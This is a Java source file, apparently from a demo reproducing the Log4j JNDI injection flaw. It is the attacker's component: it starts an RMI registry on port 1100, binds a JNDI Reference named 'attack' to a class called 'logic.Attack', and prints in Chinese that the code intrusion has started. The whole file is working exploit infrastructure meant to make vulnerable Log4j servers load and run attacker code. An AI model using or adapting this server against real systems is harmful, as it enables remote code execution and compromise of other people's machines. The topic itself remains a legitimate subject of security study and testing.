package com.dyz.log4j.bug.back.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException, NamingException {
        // 本地主机上的远程对象注册表Registry的实例
        Registry registry = LocateRegistry.createRegistry(1100);
        Reference reference = new Reference("com.dyz.log4j.bug.back.hacker.logic.Attack", "com.dyz.log4j.bug.back.hacker.logic.Attack", "com.dyz.log4j.bug.back.hacker.logic.Attack");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("attack", wrapper);
        System.out.println("代码入侵已经启动");
    }
}
